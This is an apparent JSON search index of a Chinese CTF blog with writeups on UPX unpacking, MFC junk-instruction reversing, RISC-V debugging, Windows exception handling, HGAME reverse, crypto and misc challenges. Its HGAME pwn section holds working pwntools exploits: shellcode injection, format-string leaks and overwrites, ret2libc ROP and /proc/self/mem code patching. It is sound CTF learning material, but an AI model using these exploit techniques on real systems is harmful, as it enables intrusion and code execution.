暂时还没有伪造方法 复原 都改成 UPX！ 就能 upx -d 解压了 无法用以上方法复原的情况 可以考虑用 gdb 调试，gcore 命令获取内存状况 也可以尝试用 radare2 解压内存 因为 upx 是开源的，所以有时候压缩方式会遭到更改 参考链接 https://cujo.com/upx-anti-unpacking-techniques-in-iot-malware/ https://hackmd.io/@ishitatsuyuki/B1MDOgw4Y https://github.com/radareorg/r2con2018/blob/master/talks/unpacking/Unpacking-a-Non-Unpackables.pdf","link":"/2021/10/04/UPX-%E5%A3%B3%E5%8F%8D%E8%A7%A3%E5%8E%8B%E6%8A%80%E6%9C%AF/"},{"title":"Xctf进阶-Junk_Instruction","text":"一道 MFC 题，之前找验证函数是查看字符串，但在这题里不奏效，学一下根据控件 id 找函数 patch 过的程序 Junk Instruction.exe 找关键函数 首先查找字符串 CDialog ，之后在这个字符串位置下方查看到消息映射表，在 ida 中建立如下两个结构体，分别设置类型 1234567891011121314struct AFX_MSGMAP{ const AFX_MSGMAP* (PASCAL* pfnGetBaseMap)(); const AFX_MSGMAP_ENTRY* lpEntries; //指向下面这个结构体};struct AFX_MSGMAP_ENTRY{ UINT nMessage; UINT nCode; UINT nID; //控件id UINT nLastID; UINT_PTR nSig; AFX_PMSG pfn; //对应的函数}; 使用 Resource Hacker 可以查看 check 按钮对应的 id 十六进制是 0x3e9，有一些文章里说 alt+i 查找控件 id 可以找到对应函数，但是在这题里好像找不到，所以只能根据父类的消息映射表一个个找子类映射表从而找到控件注册函数，具体寻找方法参考这 使用IDA定位基于MFC的CrackMe的按钮函数-----实践篇（一） 在地址 0x57f730（未经调试）处找到对应的入口点 去花指令 找到函数后确定 check 函数 在 check 函数可以看到 __asm { retn } 的代码，说明这里存在花指令，而这里主要存在两种花指令 call 指令相当于 push+jump，把 call 下方的地址 push 到栈里再 jump 到对应位置，这里 loc_402953 的 ebx 存放返回地址，inc ebx 把返回地址加一那么返回的地址变成 call 下面的 jump，所以这里的花指令可以把除了 mov eax，11111111h 以外的都 nop 掉 这种跟上面一样分析可以全 nop 掉 这题的花指令不算多可以手动修复，当然也可以用 idapython 脚本修复 都弄好后就可以逆 check 的逻辑 解密 rc4加密，密钥是 qwertyuiop 密文是上面的那些赋值 1234567flag=['f','2','5','0','e','3','d','7','5','8','2','0','8','4','7','d','4','2','7','f','3','a','f','1','1','a','7','8','3','3','7','9']for i in range(0,16): temp=flag[i] flag[i]=flag[31-i] flag[31-i]=tempprint('flag{'+''.join(flag)+'}')#flag{973387a11fa3f724d74802857d3e052f} 参考资料 使用IDA定位基于MFC的CrackMe的按钮函数-----实践篇（一） 使用IDA定位基于MFC的CrackMe的按钮函数-----理论篇","link":"/2021/07/21/Xctf-Junk-Instruction/"},{"title":"riscv架构的gdb调试","text":"有些逆向题会有riscv架构的，总结一下如何利用 qemu 和 gdb 调试 riscv 架构的程序 ​ riscv 架构的不能用 ida 反编译，但是 ghidra 可以 工具准备 ​ 调试 riscv 架构的程序需要准备专用的 gdb ，https://xpack.github.io/riscv-none-embed-gcc/releases/ 这里面包含各种开发工具，gdb 、gcc 、objdump…（ubuntu 的 gdb-multiarch 不支持 riscv 架构，但是其他一些系统可以） ​ 下载完后解压，进入到 bin 目录下就可以使用 gdb ​ qemu 的话直接在官网下载 ​ 如果安装的 qemu 找不到 riscv 可以参考下这个来安装 https://pdos.csail.mit.edu/6.828/2019/tools.html 调试 ​ qemu-riscv64 -g 2334 '/home/owl/桌面/main' -g 开放调试端口 ​ ./riscv-none-embed-gdb ​ 开启 gdb 后输入如下命令 ​ target remote :2334 ​ file ./main ​ 只能用原版 gdb ，gdb 插件会出错 调试时的一些指令 ​ x /10xi 0x1234：查看对应的反汇编代码 ​ info registers ：查看寄存器 ​ x /14xb 0x1234：查看内存 ​ stepi ：单步执行","link":"/2021/07/16/riscv%E6%9E%B6%E6%9E%84%E7%9A%84gdb%E8%B0%83%E8%AF%95/"},{"title":"windows 异常处理","text":"简单总结一下有关 Windows 处理异常方面的知识 SEH SEH 简单说明 ​ SEH是基于栈的异常处理，作用范围仅限当前线程，在程序产生异常时，如果程序正在被调试os 就会先把异常抛给调试器处理 ，调试器无法解决这一异常就会由进程处理，进程也无法处理就会交由 os 处理。 SEH 结构 TEB 结构体 ​ TEB 结构体是操作系统为了保存线程私有数据而创建的，TIB 是保存线程基本信息的数据结构。 ​ 在 x86 用户模式下可以由 FS 寄存器来访问当前线程 TEB数据，64位系统中则使用 gs 寄存器 SEH 的链式结构 ​ SEH 以链的形式存在，即链表，结构如图所示： ​ SEH 会在链表的头部进行异常处理函数的安装与卸载 TEB.NtTib.ExceptionList = FS:[0] ExceptionList 是 TIB 中与异常处理有关的项，指向 SEH 链 安装与卸载 安装 push @MyHandler ;异常处理程序 push FS:[0] ；SEH Linked List头 mov dword ptr fs:[0],esp ;添加链表 卸载 mov esp,dword ptr fs:[0] pop dword ptr fs:[0] ​ 安装与卸载一般发生在函数开始与结束处 VEH ​ 当异常发生时，VEH 会在 SEH 之前执行，如果 VEH 无法处理这一异常，就会由 SEH 继续处理异常 ​ 可通过 AddVectorExceptionHandler 这个 API 来注册回调函数，第一个参数可指定回调函数安装与卸载是在链表前端还是尾部 ​ 作用范围为整个进程，可捕获所有线程的异常 ​ 想要获取 VEH 异常的函数地址应该可以看程序中是否用到 AddVectorExceptionHandler 这个 API，第二个参数是异常处理函数 例子 ​ minilctf re2 ​ 这里存在两个触发异常的点，一个是访问到了不能访问的内存，另一个是除0异常 ​ 在 main 函数的开头发现异常处理函数安装的汇编代码，但调试过程中在 __except_handler4 下断点程序并不会停下，这里的 __except_handler4 里的函数应该是编译器添加的 ​ 在 TLS 函数中可以发现注册了 VEH 的异常处理程序，根据 VEH 会先于 SEH 执行，在 Handler 函数下断就能使指定的异常触发时停下 ​ 当然有关 Windows 异常处理的知识还有很多，本文没有提到，待填 参考资料 《加密与解密》 《逆向工程核心原理》 SEH详解 AddVectoredExceptionHandler 获取VEH SEH VCH UEF异常的函数地址 VEH分析 Windows调试艺术——从0开始的异常处理（下）","link":"/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"title":"HGAME  Pwn 题学习","text":"Hgame Pwn题 1.letter 所需知识： ​ 计算机中有符号数用补码来表示（用原码或反码表示都会出现重复的0），正数的补码是数本身，负数的补码是原码按位取反加 1 ，负数补码取反加 1 是其绝对值 题解： ​ 题目中没有 system() 来 getshell，参考官方 writeup 知道没开 NX保护就可以在堆栈上写入 shellcode 并执行 ​ 输入有个长度判断，根据有符号数和无符号数可以 -1 绕过 ​ 因为要在栈上执行代码所以需要 jmp rsp ，用 ROPgadget 查一下 ROPgadget --binary ./letter | grep “jmp rsp” ​ 没发现有 jmp rsp ，看了一下 writeup 尝试用输入的负数构造 jmp rsp，用 ida 查看机器码为 FF E4（FF E4就是内存中的顺序），int 为四字节所以构造 F0 00 E4 FF 的负数 -268376833 （最高位是 1 ，然后转为无符号数稍微大点的大概都行吧。。。，但是我用 FF 00 E4 FF 的时候偶尔会出错） ​ 这里可以看到程序利用沙箱只允许使用部分系统调用，第二个参数是白名单的意思，可以根据系统调用号查得只允许使用 open ，read ，write，或者用 seccomp-tools 直接看开了什么。那么接下来就用这几个系统调用来打开并读取 flag 文件内容 ​ 下面是 exp 123456789101112131415161718192021from pwn import *context.arch = 'amd64'context.log_level = 'debug'r = process('./letter')r.sendlineafter('?','-268376833')#程序是 amd64 的shellcode = shellcraft.amd64.open('./flag')shellcode += shellcraft.amd64.read('rax','rsp',0x30)shellcode += shellcraft.amd64.write(1,'rsp',0x30)r.sendline('a'*0x18+p64(0x60108C)+asm(shellcode))r.interactive() ​ 本地复现结果 2.once 所需知识： 32位程序中的 printf 函数逆序传参，参数都存放在栈上 64位程序中的 printf 函数也是逆序传参，前 6 个参数（从右到左）存放在寄存器中，依次为 RDI、RSI、RDX、 RCX、 R8以及R9 ，其他多的参数存在栈上 题解： ​ 先用 checksec 查一下，开启了 PIE 保护 ​ ida 反编译发现 ​ 没有直接的 system 或 execve 来 getshell，但 vuln 函数里有格式化字符串漏洞 printf ，题目中也给了 libc版本，可以 leak 出 libc 基址再加上 one_gadget 来 getshell ​ Constraints 意思是限制条件，不满足条件的没法用 ​ 下面是 exp 1234567891011121314151617181920212223242526from pwn import *libc = ELF('./libc-2.27.so')r = process('./once')context.log_level = 'debug'pay1 = '%13$p\\n' pay1 = pay1.ljust(0x28,'a') #补齐到 0x28pay1 += '\\xD3'r.sendafter('turn: ',pay1)addr = r.recvuntil('\\n')addr = addr.strip('\\n')addr = int(addr,16) #int函数有第二个参数那第一个参数要是字符，第二个参数表示输入的进制数libcbase = addr - 231 -libc.symbols['__libc_start_main']pay2 = 'a' * 0x28 + p64(libcbase + 0x4f3d5)r.sendlineafter('turn: ',pay2)r.interactive() ​ ​ 开启了 pie 随机化，但因为内存分页制度（好像是这个）地址的最低12位是不变的，所以可以覆盖返回地址最低位的一个字节来回到 vuln 函数开头 ​ 关于为什么是 D3 而不是 D2 我还没弄明白，此处待填（https://hack543.com/16-bytes-stack-alignment-movaps-issue/） ​ 还有 libc_start_main 地址泄露的 %13$p（输出第13个参数） 3.rop_primary 所需知识： ​ **rop 学习：**https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc ​ 延迟绑定机制： ​ 函数等到用到时才进行绑定，第一次调用时 got 表里保存的是 plt表 push XX 的地址，然后 _ dl_runtime_resolve () 函数会去 libc 库里找到函数真正的地址写到 got 表里 ​ ​ x86 与 x64 ROP区别（vidar 培训的图）： 题解： ​ ​ 开了 NX 保护，那就是 rop 绕过，ida f5 可以看到有通过命令行参数（argv[1]）打开的文件，之后在文件里读取三个矩阵，本地调试的话可以构造一个这样的文件。check 函数检测矩阵 a，b 进行乘法运算的结果与 c 矩阵比较 ​ vuln 函数可以溢出，没有 system 和 /bin/sh，那就需要通过 read 函数泄露 libc 版本获得 ​ 下面是 exp（因为自己写的 exp 不小心删掉了，所以前面矩阵运算借鉴了官方 writeup 的） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *from LibcSearcher import *def read_martix(): matrix = [] while True: line = r.recvuntil('\\n').strip() if '\\t' not in line: break row = [] for num in line.split('\\t'): row.append(int(num)) matrix.append(row) return matrix def multi(a, b): rows = len(a) mid = len(b) cols = len(b[0]) martixC = [] for i in range(rows): row = [] for j in range(cols): num = 0 for k in range(mid): num += a[i][k] * b[k][j] row.append(num) martixC.append(row) return martixCcontext.log_level = 'debug'context.arch = 'amd64'elf = ELF('./rop_primary')r = elf.process(argv = ['martix']) #添加命令行参数r.recvuntil('A:\\n')martixA = read_martix()martixB = read_martix()martixC = multi(martixA,martixB)for row in martixC: for n in row: r.sendline(str(n))poprdi = 0x401613 #用 ROPgadget 获取 poprdi ; ret 地址ret = 0x40101a again = 0x40157Cpay = 'a'*0x38 + p64(poprdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])pay += p64(again)r.sendlineafter('best\\n',pay)#leak并计算基址leak_addr = u64(r.recv(6).ljust(8,'\\x00'))libc = LibcSearcher('puts',leak_addr)libcbase = leak_addr - libc.dump('puts')binsh = libcbase + libc.dump('str_bin_sh') system = libcbase + libc.dump('system')#getshellpay2 = 'a'*0x38 + p64(poprdi) +p64(binsh) + p64(system)r.sendlineafter('best\\n',pay2)r.interactive() 4.killer queen 格式化字符串，改 retn 地址，注意 memset 操作会覆盖 format，所以需要 choice1 写入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearcherr = process('./killerqueen')context.log_level='debug'#context.terminal = ['tmux','splitw']#gdb.attach(r,&quot;break choice2&quot;)#gdb.attach(proc.pidof(r)[0],&quot;break choice2&quot;)r.sendlineafter(&quot;X、去接将要打来的电话\\n&quot;,'0')weather = int(r.recvuntil(&quot;:&quot;)[:-1])print(weather)payload = 'a'.ljust(0x100,'a')r.sendlineafter(&quot;说点什么\\n&quot;,payload)#leak libc 地址payload = b&quot;%19$p-%38$p&quot;r.sendlineafter(&quot;X、去接将要打来的电话\\n&quot;,str(4294967294-weather))r.sendlineafter(&quot;那么，电话号码是——\\n&quot;,payload)r.recvuntil(&quot;「Killer Queen」杀死了岸边露伴...\\n&quot;)stdout = int(r.recvuntil('-')[:-1],16)retn_addr = int(r.recvuntil('\\n')[:-1],16)log.success(&quot;stdout_addr: &quot;+hex(stdout))log.success(&quot;retn_addr: &quot;+hex(retn_addr))libc = LibcSearcher(&quot;_IO_2_1_stdout_&quot;,stdout)libc_base = stdout - libc.dump('_IO_2_1_stdout_')onegadget = 0x4f3d5print(hex(libc_base+onegadget))target = libc_base+onegadgetretn_addr += 8#覆盖返回地址if target&amp;0xffff &gt; ((target&amp;0xffff0000)&gt;&gt;16): payload = (&quot;%&quot;+str((target&amp;0xffff0000)&gt;&gt;16)+&quot;c&quot;+&quot;%10$hn&quot;+&quot;%&quot;+str((target&amp;0xffff)-((target&amp;0xffff0000)&gt;&gt;16))+&quot;c&quot;+&quot;%11$hn&quot;).ljust(32,'a')+p64(retn_addr+2)+p64(retn_addr)else: payload = (&quot;%&quot;+str(target&amp;0xffff)+&quot;c&quot;+&quot;%10$hn&quot;+&quot;%&quot;+str((target&amp;0xffff0000)&gt;&gt;16 - (target&amp;0xffff))+&quot;c&quot;+&quot;%11$hn&quot;).ljust(32,'a')+p64(retn_addr)+p64(retn_addr+2)r.sendlineafter(&quot;说点什么\\n&quot;,payload)r.sendlineafter(&quot;说点什么\\n&quot;,'aaa')r.interactive() 5.patriot’s note 6.the_shop_of_cosmos proc 文件系统，/proc/self/mem 可读写程序，包括 .text 段，/proc/self/maps 获取各种基址 12345678910111213141516171819202122232425262728293031323334353637from pwn import *r = process('./shop')elf = ELF('./shop')context.log_level='debug'context.arch = 'amd64'libc = ELF('./libc.so.6')# 增加钱r.sendlineafter(&quot;&gt;&gt; &quot;,'1')r.sendlineafter(&quot;&gt;&gt; &quot;,'-50')# 获取基址r.sendlineafter(&quot;&gt;&gt; &quot;,'2')r.sendlineafter(&quot;&gt;&gt; &quot;,'1')r.sendlineafter(&quot;&gt;&gt; &quot;,'/proc/self/maps')r.recvuntil('：')prog_base = int(r.recvuntil('-')[:-1],16)log.success(&quot;prog_base: &quot;+hex(prog_base))# 写 shellcoder.sendlineafter(&quot;&gt;&gt; &quot;,'3')r.sendlineafter(&quot;&gt;&gt; &quot;,'1')r.sendlineafter(&quot;&gt;&gt; &quot;,'/proc/self/mem')r.sendlineafter(&quot;&gt;&gt; &quot;,str(prog_base+0x1652))shellcode = asm(shellcraft.sh())r.sendlineafter(&quot;&gt;&gt; &quot;,str(len(shellcode)))r.sendlineafter(&quot;&gt;&gt; &quot;,shellcode)r.sendlineafter(&quot;&gt;&gt; &quot;,'3')r.sendlineafter(&quot;&gt;&gt; &quot;,'3')r.sendlineafter(&quot;&gt;&gt; &quot;,'1')r.interactive()","link":"/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/"},{"title":"HGAME-Week4-Writeup","text":"Week4 Re 1.vm ​ 这部分逻辑很清晰，重点在中间这个加密的部分，点进去查看这个函数发现 switch-case 应该是vm，每个case都是一个 opcode ​ 题目里说 ovm++ hates debugger ，那就先调试一下，调试后可以猜测出具体的加密部分 ​ 输入的 flag 先是经过异或加密，之后又有减法操作，加密后与密文进行比较，写脚本解一下就能得到 flag 12345678910111213cipher = [0xcf,0xbf,0x80,0x3b,0xf6,0xaf,0x7e,0x02,0x24,0xed,0x70,0x3a,0xf4,0xeb,0x7a,0x4a,0xe7,0xf7,0xa2,0x67,0x17,0xf0,0xc6,0x76,0x36,0xe8,0xad,0x82,0x2e,0xdb,0xb7,0x4f,0xe6,0x09]table1 = [0xFE,0x21,0x44,0x67,0x8A,0xAD,0xD0,0xF3,0x16,0x39,0x5c,0x7f,0xa2,0xc5,0xe8,0x0b,0x2e,0x51,0x74,0x97,0xba,0xdd,0x00,0x23,0x46,0x69,0x8c,0xaf,0xd2,0xf5,0x18,0x3b,0x5e,0x81]table2 = [0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a]for i in range(34): if cipher[i] + table2[33-i] &lt; 256: cipher[i] += table2[33-i] else: cipher[i] = cipher[i] + table2[33-i] - 256for i in range(34): cipher[i] ^= table1[33-i] print(chr(cipher[i]),end = &quot;&quot;) ​ 这道题标准解法应该不是这样解的，而是要先要翻译出对应的汇编代码再分析，但这部分我还不太明白之后再补上吧 2.A 5 Second Challenge ​ 这题要感谢小圆学长的耐心回答!! ​ 下载得到的是用unity制作的扫雷游戏，刚开始为了获得源码用 il2cppdumper 处理 GameAssembly.dll ，但发现处理后得到的不全，之后问了一下小圆学长发现源码已经给了。 ​ 打开 AFiveSecondChallenge.cpp ，源码里有 getUnixtime 这类获取时间的函数，游戏时间超过 5s 就会显示超时，用锁住系统时间的软件可以避开这一检测。锁定时间后就可以开始玩扫雷，几局下来后会发现雷的位置能构成二维码 ​ 根据题目提示，把 managed 文件夹下的 dll 拖到 ida 里，会发现有一个函数被nop掉了，定位到源码里查看（il2cpp的中间文件有些混乱，删除了影响判断的部分） ​ 这里的 return 判断是否是雷的位置，本来分析到这里已经很清楚了但是因为我完全不懂类和方法什么的看了挺久 ​ GetAt函数的返回值没在源码里看到有初始赋值于是迷惑了好久，又去问了一下小圆学长这部分是在哪里初始化过，得到回复说是在那个 dll 里面。 ​ 但是我在我下载的东西里面没发现 m_Items 初始化的部分，去网站上重新下载并拖到 ilspy ，得到了这个数组里的值 ​ 接下来就是写脚本解题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;stdio.h&gt;#include&lt;math.h&gt;double matrix[45][15][3] = ;double GetAt(i, j, k){ int iBound = 45; //45 int jBound = 15; //15 int kBound = 3; //3 return matrix[i][j][k];}int main(){ int y,x; FILE* fp; fp = fopen(&quot;************&quot; , &quot;w&quot;); int a[45][45]; int i, j; for (y = 0; y &lt; 45; y++) { for (x = 0; x &lt; 45; x++) { double L_8 = GetAt(y, x / 3, 0); double L_14 = GetAt(y, x / 3, 1); double V_0 = L_14; double L_20 = GetAt(y, x / 3, 2); double V_1 = L_20; double V_2 = fmod(x, 3.0f) - 1.0f; a[x][y] = L_8* V_2* V_2 + V_0 * V_2 + V_1 &gt; 0.0 ? 1 : 0; //1是雷 } } for (i = 0; i &lt; 45; i++) { for (j = 0; j &lt; 45; j++) { printf(&quot;%d&quot;, a[j][i]); if (a[j][i] == 1) fprintf(fp, &quot;%d,%d\\n&quot;, j, i); } printf(&quot;\\n&quot;); } fclose(fp); return 0;} 123456import matplotlib.pyplot as pltimport numpy as npx,y = np.loadtxt('./xy.txt',delimiter=',',unpack=True)plt.plot(x,y,'.')plt.show() 3.nllvm ​ 拖到 ida 里发现挺乱的，也没看到控制台输出的那些文字，那就先调试看看 ​ 调试后发现这些异或操作得到的就是控制台输出的字符，在输出后又来了一遍异或还原。 ​ 接着调试发现判断输入字符串的地方 ​ 这一部分异或得到 “CryptoFAILUREforRSA2048Key!!!” 这个字符串，接着来到加密的函数 ​ 传入的就是这部分异或得到字符串和输入的 flag，之后看了一下这个函数里面是一些比较复杂的运算猜测是某种算法，我对各种算法不是很熟所以用了 ida 插件 findcrypt ，但是这个插件并没有找到什么算法于是我就去找学长确认了一下 ​ 查了各种算法，最后发现加密函数里面的一个函数像是s盒，根据s盒数字判断又是 AES 加密 ( s盒也是异或得到的，这大概是插件检测不出算法的原因 ) ​ 在调试过程中可以知道 iv值是 123456789abcdef ，判断是否为正确 flag 的部分与密文进行比较，改变了输出字符的外观（表示是否回到现实） ​ 之后用我在week2写的脚本解就行 ​ 查了一下题目里的 llvm ，是一款代码混淆器，具体的是看了这篇文章https://bbs.pediy.com/thread-224484.htm Misc 1.Akira之瞳-1 ​ 查资料知道这种 dump 出来的RAW 文件要在 linux 里用 volatility 看，先查一下系统版本 ​ 接着用 pslist 查看一下系统进程，找到可疑的进程后 dump 出来 ​ 用 foremost 分离出一个加密的压缩包，本来以为密码还在 raw 文件里面的某个文件里来回看了好多遍，之后用 010editor 打开压缩包后发现提示，zip 密码是系统登陆密码 ​ hashdump 一下得到登陆密码的 hash 值 ​ 按提示把密码解出来 ​ 打开压缩包后发现两张图片，名字是src 和 blind，很容易就想到盲水印，用这个工具 (https://github.com/chishaxie/BlindWaterMark) 提取出水印 ​ 图片里小写的 L 是数字1 2.Akira之瞳-2 ​ 得到一个加密压缩包和 RAW 文件，同样先查看一下进程，发现 notepad进程 dump出来 ​ 在 dump 出来的进程里查一下 password 字符串，得到 zip 密码 ​ 打开压缩包得到 ​ 这几个文件名好像在哪里见过，翻了一下往年的 writeup 知道container 是加密容器，cookies 是chrome浏览器的 cookie 数据库。但是看 cookies 文件内容和打开加密卷都需要密码，回到 linux 里再查一下有无密码，因为是 notepad 进程那就查 txt 文件 ​ 这个 dumpme.txt 很可疑，提取出来发现之前 zip 密码还有后半句。百度一下知道 lastpass 是 chrome 浏览器的插件，用来记录密码的，把 lastpass 和 dump 放在一起搜索找到 volatility 里有 lastpass 这个插件 ​ 得到一个密码，下载 ChromeCookiesView ，加载 cookies 文件并输入密码，得到加密容器密码并提示用 VeraCrypt 打开 ​ 打开虚拟分区得到一张图片，查 ADS 得知 NTFS 隐写 ​ NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。 ​ 然后用 Ntfs Streams Editor 这个软件查看 ADS 流文件，得到 flag ​ 那个网址里的图是 Akira 学长的新头像 总结 ​ 为时四周的 hgme 要结束了，这个寒假学到了很多东西过得很充实，希望以后能继续学习这方面的知识，不断进步","link":"/2021/03/27/HGAME-Week4-Writeup/"},{"title":"HGAME-Week3-Writeup","text":"Week3 Re 1.FAKE ​ 拖到ida ​ 关键函数里有36个方程，36个变量，那就不可能普通的解出来， ​ 查找字符串得到提示 Try angr or z3，我用的是 z3库，脚本太长了就不放了（用z3库解的时候一直跑不出结果，就去问了 r3n0学长，学长说可能需要点时间，但之后我重新弄了一下add的部分很快就跑出来了，应该是我自己中间操作上的问题…） ​ 假flag，查一下SMC 1SMC(self-Modifying Code)，就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。 ​ 在ida里找一下smc自解密的部分 ​ 这段代码执行后才得到真正的代码，写 idc 脚本来解密 ida 反编译后错误的代码 123456789101112#include &lt;idc.idc&gt;static main(){ auto addr = 0x00401216; //函数地址 auto addr2 = 0x00409080; //byte数组地址 auto i = 0; for(i=0;i&lt;=0x43E;i++) { PatchByte(addr+i,Byte(addr+i)^Byte(addr2+i)); }} ​ 得到运行过程中真正的代码 ​ 这部分继续用z3库写脚本去解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from z3 import *s = Solver()a1 = [0] * 36for i in range(36): a1[i] = Int('a1[' + str(i) + ']')v3 = [0]*36v2 = [0]*36v4 = [0]*36v3[0] = 55030v3[1] = 61095v3[2] = 60151v3[3] = 57247v3[4] = 56780v3[5] = 55726v3[6] = 46642v3[7] = 52931v3[8] = 53580v3[9] = 50437v3[10] = 50062v3[11] = 44186v3[12] = 44909v3[13] = 46490v3[14] = 46024v3[15] = 44347v3[16] = 43850v3[17] = 44368v3[18] = 54990v3[19] = 61884v3[20] = 61202v3[21] = 58139v3[22] = 57730v3[23] = 54964v3[24] = 48849v3[25] = 51026v3[26] = 49629v3[27] = 48219v3[28] = 47904v3[29] = 50823v3[30] = 46596v3[31] = 50517v3[32] = 48421v3[33] = 46143v3[34] = 46102v3[35] = 46744v2[0] = 104v2[1] = 103v2[2] = 97v2[3] = 109v2[4] = 101v2[5] = 123v2[6] = 64v2[7] = 95v2[8] = 70v2[9] = 65v2[10] = 75v2[11] = 69v2[12] = 95v2[13] = 102v2[14] = 108v2[15] = 97v2[16] = 103v2[17] = 33v2[18] = 45v2[19] = 100v2[20] = 111v2[21] = 95v2[22] = 89v2[23] = 48v2[24] = 117v2[25] = 95v2[26] = 107v2[27] = 111v2[28] = 110v2[29] = 119v2[30] = 95v2[31] = 83v2[32] = 77v2[33] = 67v2[34] = 63v2[35] = 125for i in range(0,6): for j in range(0,6): for k in range(0,6): v4[6 * i + j] += v2[6 * k + j] * a1[6 * i + k]for i in range(0,6): for j in range(0,6): s.add(v4[6*i+j] == v3[6 * i + j])s.check()result = s.model()for i in range(0, 36): print(result[a1[i]], end=' ') Crypto 1.LikiPrime ​ 还是 RSA，不过素数 N 更大了，但是放到网站里分解还是能分解出 q和 p，之后就是用上周的脚本跑出flag 2.HappyNewYear!! ​ e = 3，发送内容相同，自然就想到低指数广播攻击，但是广播攻击只需要 e组数据，那么猜测给的数据里解出来的明文不是全部相同。 ​ 低指数广播攻击需要用到中国剩余定理（孙子定理），脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344from libnum import n2simport gmpy2from functools import reducedef modinv(a, m): return int(gmpy2.invert(gmpy2.mpz(a), gmpy2.mpz(m)))def chinese_remainder(n, a): sum = 0 prod = reduce(lambda a, b: a * b, n) for n_i, a_i in zip(n, a): p = prod // n_i sum += a_i * modinv(p, n_i) * p return int(sum % prod)n1 = c1 = n2 = c2 = n3 = c3 = n4 = c4 = n5 = c5 =n6 = c6 = n7 = c7 = nset = [n2,n4,n6]cset = [c2,c4,c6]m = chinese_remainder(nset, cset)m = gmpy2.iroot(m,3)m = int(m[0])print(n2s(m)) c1,c3,c5 解密得到一个片段，c2,c4,c6解密得到剩下的flag片段（本来写的是随机在给出的7组数据里挑三组解密，但是没跑出结果，后来手动试了一下试出来了） Misc 1.A R K ​ 打开下载的流量包，首先看到dns里的域名 ​ 刚开始以为跟网址有关，但后来题目里说 “本题目所有解题操作均只用流量，与网址无关” ，那就接着看其他包，查资料知道 TLS 加密尝试找到流量包里的证书 ​ 导出原始数据保存为 ssl.log ,再重新导入解密 ​ 找到解密后的 HTTP 流，导出后得到一堆json文件，导出来后卡了一段时间，之后看到题目的补充信息 ​ 补充说明：明日方舟是一款塔防游戏，可以将可部署单位放置在场地中。并且具有自律功能，可以记录部署的操作。 翻译：没用 没用 出题人用可部署单位画了个东西 背景是白色的 ​ 记录部署操作？！那就打开 getBattleReplay 文件，看到像是 base64 编码的字符串，解码看到 zip 文件头标识另存为 zip，解压打开发现配对的 row 和 col ，应该是部署的坐标，再根据题目里的 画了个东西 猜测这些坐标是二维码黑色部分，处理一下再运行脚本 ​ 扫码得flag 2.A R C ​ 压缩包加密了，那就先看图片找密码 ​ 刚开始误以为 BV 是某种 CTF 中的加密方式，在网上搜索了一圈没有收获，于是去问 Akira 学长 BV 除了 b站BV号还有什么意思，学长的答复是 ​ 怎么实现的？查 av号怎样转 bv号后发现 https://www.zhihu.com/question/381784377/answer/1099438784 这个回答里的实现方法，根据 hint1：8558 应该理解成85和58，BV号_是所以图片里的是__ 先对图里的密文进行 base85 解密 ​ 根据长度判断应该是 av号转 bv号算法里的table，那就换一下上面链接里代码的table，密文是压缩包名里的数字，跑一下得到压缩包密码 ​ 打开后得到一段 arc 视频和密文，用题目里给的软件播放视频得到 ​ 发现图中第一行文字和文本里文字相似，猜测是同种加密方式，之后又没有思路了，hint2里提到 词频分析是个好东西，别忘了视频里的问题 ，查了下视频里的问题但没什么发现。后来又放出hint 用了某种ROT的范围，但是位移不一样 ，根据两个字符的应该是 is 之类的尝试将每个字符后移10位，得到了一段英文，然后又卡住了。于是又去问 Akira学长，学长说并不是后移10位提示我再想想视频里问题的答案，突然想起之前有查到 42 这个数字，尝试后移42位得到正确的文字 ​ 视频里文字第一行也是后移 42位得到 MSU 密码，解密得到的文字里提到视频里第二行的加密方法 Liki学长提到过，根据 week1 crypto的第一题，第二行文字加密方法应该是维吉尼亚，密钥是 Akira ​ 在 virtualDub2里安装MSUstego插件，用之前得到的密码对视频进行解密，得到网址、光和对立的名字，访问网站输入用户名和密码 ​ 根据hint5: / 不是可输入的意思，是网站路径，想起之前视频解出的第二行还没用上，那就在网站路径后输入解出的明文，得到flag（pm） ​ 这周misc虽然难但很有趣，梗挺多的 总结： ​ 这周因为跟父母回老家拜年少了很多做题的时间，之后电脑还出了故障重装了系统，下周要专注于re了，不能再靠着 misc 和 crypto 上分了 接下来是没做出来的部分 re ​ Gun这道题用查壳工具查得是梆梆免费版加固，想要脱壳，用了很多网上查到的方法但都失败了，问了 Trotsky学长，推荐使用frida-dexdump脱壳，但是因为这道题需要root过的真机（模拟器不行）来进行脱壳，所以最后只能放弃 ​ hello_re3我没太搞明白，拖进ida发现应该都是调试信息，mezone学长说要用dbgview看调试信息再定位到程序里，可惜这题是最后一天才做的，最后没时间了，打算看官方writeup再学习一下 Crypto ​ EncryptedChats这题尝试了各种方法去解，还是解不出 a 和 b ，需要的时间都很长，但是 g 挺大（不是2、5这种很小的） a 跟 b 应该是能解出来的…","link":"/2021/03/27/HGAME-Week3-Writeup/"},{"title":"HGAME-Week2-Writeup","text":"Week2 Web 1.LazyDogR4U ​ 